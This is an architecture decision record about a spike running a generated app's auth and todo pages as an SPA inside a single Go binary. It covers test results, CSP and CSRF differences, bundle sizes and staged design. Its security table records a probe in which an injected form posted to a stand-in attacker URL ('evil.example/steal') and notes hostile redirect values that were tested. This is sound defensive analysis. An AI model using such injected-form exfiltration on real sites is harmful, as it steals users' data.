# ADR 0039: embed mode with sign-in and resource pages (spike)

Status: accepted as a finding (2026-11-25). The implementation is not scheduled. The owner has not confirmed the ruling of section 6.  
Extends: ADR 0014 (embed mode), ADR 0038 (Solid 2 investigation, section E10)  
Spike: branch `spike/embed-auth`, commit `a89ba5d`. The branch is a reference. Do not merge it. Do not delete it.

## 1. Context

Embed mode builds the web app with adapter-static and `ssr = false`. The Go binary serves the build with `app.WithSPA`.
ADR 0014 refuses the `auth` module and server pages in embed mode. The reason is that these pages use SvelteKit form actions.
ADR 0038, section "E10: SPA mode", showed that a Solid 2 SPA passes 10 of 16 web e2e tests. That result raised a question.

The question: can a generated app with the `auth` module and a resource run as one Go binary in embed mode on SvelteKit 3?
The pages must call the Go API directly from the browser. The spike stays on SvelteKit 3 and changes no framework.

The acceptance is the six specs of `testdata/e2e/web/tests`, unchanged. Both `E2E_BASE_URL` and `E2E_API_URL` point at the binary.
A test that cannot pass in an SPA is a finding. No spec was edited. A changed copy in `spikes/embed-auth/variant/` may show that a behavior works.

The spike changed nothing outside `spikes/embed-auth/`. The kit, the packs, the generators, and the golden files are as they were.

## 2. Spike results

The spike generated an app with `ci`, `auth`, `flags`, and `live`, plus the `todo` resource.
The API change is two lines in `main.go` and the `webdist` package. The Go API was already the authority for sessions, CSRF, and validation.
The shell, sign-in, register, sign-out, the guards, the flags, the admin flags page, the todo pages, and live data work in the one binary.

10 of the 16 tests pass. 6 fail. The probes and the changed copies of specs in `variant/` gave 23 passed and 0 failed.
One agent built the spike. A second agent reviewed it, and its 7 findings are fixed or recorded.
The orchestrator then ran `spikes/embed-auth/run.sh` from a clean directory on 2026-11-25. It gave exit 0 and "0 mismatches" against the record. `shell.spec.ts` and `auth.spec.ts` with `--repeat-each=10` gave 40 passed and 0 failed.

| Test | Result | Reason |
|---|---|---|
| `apidocs`: the API reference has a strict script policy | pass | |
| `auth`: three tests (redirect to sign-in and back, register, wrong password) | pass | |
| `ratelimit`: a client with too many logins is refused | pass | The API trusts the loopback peer and reads `X-Forwarded-For` (ADR 0016). |
| `shell`: the sidebar marks the page, and the user menu signs out | pass | |
| `todos`: empty title, 20 rows on a page, row menu, checked checkbox | pass | Four tests. |
| `todos`: create, toggle, edit, delete | fail | The spec waits for a POST whose URL has "toggle". The SPA sends `PUT /api/todos/{id}`. Coupling to node mode. |
| `todos`: the toggle on page 2 stays on page 2 | fail | The same wait for "toggle". Coupling to node mode. The changed copy passes. |
| `xss`: markup in a title stays text | fail | The nonce helper returns null, because the shell has a hash, not a nonce. Coupling. The changed copy passes. |
| `todos`: another user's todo gives 404 | fail | The binary answers 200 for each page path. The page shows "Page not found". A limit of a static shell. |
| `todos`: the checkbox toggles without JavaScript | fail | Without JavaScript the SPA renders no page. A limit of an SPA. |
| `xss`: each page response has its own nonce | fail | One `index.html` has one hash for all responses. A limit of a static shell. |

So 3 failures are coupling and 3 are real limits. `run.sh` checks each failure at its recorded line in the spec.
It also checks that no other test fails and that no expected failure passes.

## 3. Security differences from node mode

The spike records these differences. None is silent.

| Subject | Node mode | Embed mode in the spike |
|---|---|---|
| `script-src` | `'self'` and a nonce for each response | `'self'` and the hash of the boot script. Both block an injected inline script. |
| `form-action` | `'self'` | Absent. A form that an attacker injects can post to another origin. The probe saw `POST http://evil.example/steal`. |
| `img-src`, `font-src` | `'self' data:` | Absent. `default-src 'self'` applies, so `data:` is blocked. |
| `connect-src` | `'self'` | Absent. `default-src 'self'` gives the same result. |
| CSRF | SvelteKit `csrf.trustedOrigins` on form actions, then the Go check | The Go `http.CrossOriginProtection` only. Cross-site POST, PUT, and DELETE with the cookie gave 403. |
| Signed-out `GET /todos` | 303 to `/login?redirectTo=%2Ftodos` | 200 with the empty shell. The page code of each page is public, also the admin page. It holds no data. |
| Signed-out API | | `/api/session` 401, `/api/todos` 401, `/api/admin/flags` 401, `/api/flags` 200. The public flags are public in both modes. |
| Session cookie | `HttpOnly`, `SameSite=Lax` | The same. `Secure` is off only with `SPINUP_ENV=dev`. |
| Open redirect | `safeRedirect` | The same function, unchanged. Four hostile `redirectTo` values landed on `/todos`. |
| Failed sign-out | The server deletes the cookie | The `HttpOnly` cookie stays. The user sees an error and stays signed in. |
| Console of a signed-out visitor | Clean | One 401 line for each page load. |
| XSS | Svelte escapes text | The same. The changed copy shows the markup as text, with no CSP violation. |

A signed-in flow (register, `/account`, a client link, sign-out, sign-in) gave no CSP violation.
Rate limit behind Caddy: not checked.

## 4. Measurements

| Measure | Node build | SPA build |
|---|---|---|
| Client files | 41 | 47 |
| Raw bytes | 611,706 | 659,850 |
| Brotli bytes | 167,679 | 183,348 |
| Lines in `web/src` | 6,608 | 6,308 |
| Todo page lines | 787 | 776 |

The brotli difference is +15,669 bytes, or +9.3 %. The browser now carries superforms in SPA mode, the zod validators, and `openapi-fetch`.
A generator would no longer write 19 server files, with 1,148 lines. The spike writes browser files in their place.
First paint time: not measured.

## 5. What is lost

Each loss has evidence in `spikes/embed-auth/results.txt`, section "Lost against node mode".

- Forms without JavaScript. `curl` `POST /login` on the binary gives 405.
- A real 404 document status.
- A CSP nonce for each response. The hash stays strict.
- `form-action 'self'`, `img-src data:`, and `font-src data:` in the CSP.
- Server-side loading. A signed-out visitor gets the empty shell, not a 303.
- Cookie deletion when the sign-out call fails.
- A clean console for a signed-out visitor.
- The Node server telemetry. The Go spans remain. Browser traces: not checked.
- Server-side validation in the web tier. The Go API stays the authority.
- Bundle size: +9.3 % brotli bytes.

The password rule changes, and it is not a loss. The password stays in the field after a server error, because it never leaves the browser.

## 6. Decision

Go on feasibility. Do not implement in this run. The owner has not scheduled the work.
Embed mode can hold the `auth` module and resource pages on SvelteKit 3. The refusals of ADR 0014 can go in a later milestone.
This ADR does not remove them. Until that milestone, the refusals stay as they are.

Reasons:

1. 10 of 16 unchanged tests pass against one binary. Of the 6 failures, 3 are spec coupling and 3 are real limits.
2. The API change is two lines in `main.go` plus the `webdist` package.
3. Each loss is known and has evidence.

The costs of an implementation:

1. **Two page families.** Each pack with pages (auth, flags, apikeys, billing) and the resource generator hold a node family and an embed family.
   Each later page feature is written two times. The golden trees of embed mode grow.
2. **A client session layer.** Node mode reads the session for each request. The SPA reads it one time.
   The spike needed `lib/session-watch.ts`. It reads the session again on `visibilitychange` and after an API 401.
   A visible tab that makes no API call keeps the old user. The review found the stale session. The fix pass found a race between the live helper and sign-out.
3. **The sign-out workaround must not ship.** The spike returns the plain `/login` for two seconds after a sign-out.
   A real implementation must remove the cause. It closes the live stream before the sign-out call. Or it stops the live helper from calling `invalidateAll()` after a 401 in embed mode.
4. **A larger bundle.** The brotli bytes grow by 9.3 %.

Rejected alternatives:

- One universal page family for both modes. Node mode would lose forms without JavaScript, which `todos.spec.ts` tests.
- A Go route `POST /api/todos/{id}/toggle` only to pass the two toggle tests. A spec that waits for the write request of either mode is the smaller change.
- A kit change in the spike, such as the `form-action` directive. The spike changes nothing outside `spikes/embed-auth/`.

## 7. Design

Do the stages in this order. The first stage helps embed mode without sign-in.

**Stage 0, the kit and the embed pack of today.**
- Add `form-action 'self'` to the shell policy in `kit/app/spa_index.go`.
- Decide `img-src` and `font-src` with `data:`.
- Give the embed build a stable `kit.version.name`. The build time in `index.html` changes the script hash for each build. Two builds of one tree gave two hashes. The value is not decided.

**Stage 1, the web pack.**
- Add the embed root `+layout.ts` with the session and flags load.
- Add `lib/auth.ts` (the guards, the unchanged `safeRedirect`, `loginHref`), the session watch, and sign-out.
- Add the `zodJitless` plugin to the embed `vite.config.js`.
- One module owns the session state.

**Stage 2, the auth pack.**
- Add embed pages for login, register, account, reset, and reset with a token.
- Add the OIDC buttons and the callback return path.
- Generate zod schemas for the auth forms.
- Remove the refusals at `internal/gen/newapp/newapp.go:151` and `internal/modules/select.go:66`.

**Stage 3, the generators.**
- Add universal `+page.ts` twins for the four server templates of `internal/gen/resource/pages_server.go`.
- Add SPA Svelte templates and one `form.ts` for each resource.
- Write the navigation links in embed mode (`internal/gen/resource/nav.go:29`).
- Call `liveRefresh(feed, { invalidate })` for `--live`.
- Give `g page --server` a meaning in embed mode.

**Stage 4, the other modules.**
- Convert flags first. The admin page worked in the spike.
- Then convert apikeys, billing, and the audit history pages.
- Each module stays refused in embed mode until its pages exist. The refusal moves from "auth" to each module that is not converted.

**Tests.**
- Add an embed run of the six web e2e specs.
- Make the specs neutral where coupling is the only cause. Wait for the write request of either mode. Accept a nonce or a hash in the helper.
- Give the three real limits an expectation for each mode.
- Invert the refusal tests: `testdata/script/embed.txtar`, `module_add.txtar`, `live_module.txtar`, `newapp_test.go:538`, `select_test.go:89`, `pages_test.go:603`, and `page_test.go:144`.
- Update the golden trees and `packs.digest`.

**Docs.**
- `docs/embed.md` lists the losses.
- Remove the refusal text from `docs/embed.md`, `docs/web.md`, `docs/commands/module.md`, `docs/commands/generate-page.md`, `docs/build/flags.md`, and `docs/build/live.md`.
- Add notes in ADR 0014, ADR 0029, and ADR 0033 that point to this ADR.

## 8. Open decisions

The owner decides these.

- When the work starts, and which modules the first release holds.
- The value of the stable `kit.version.name`.
- Whether a signed-out `GET /api/session` keeps the 401 or gets another answer. The 401 gives one console error line for each signed-out page load.
- Whether the kit gets a route that clears the session cookie when the sign-out call fails.
- The refresh policy of the public flags in the browser. The spike reads them in the root load, not on client navigation.

## 9. Not done

- Firefox and WebKit.
- A Docker image, a deploy, and Caddy with TLS.
- A real tab switch. The probe dispatched `visibilitychange`, because headless Chromium does not fire it.
- First paint time.
- The reset pages, OIDC, the history pages, apikeys, billing, and mcp.
- Browser traces.
- A signed-in node page measurement. The node CSP came from a build with no API behind it.
- A stable `kit.version.name`. The spike did not change it.
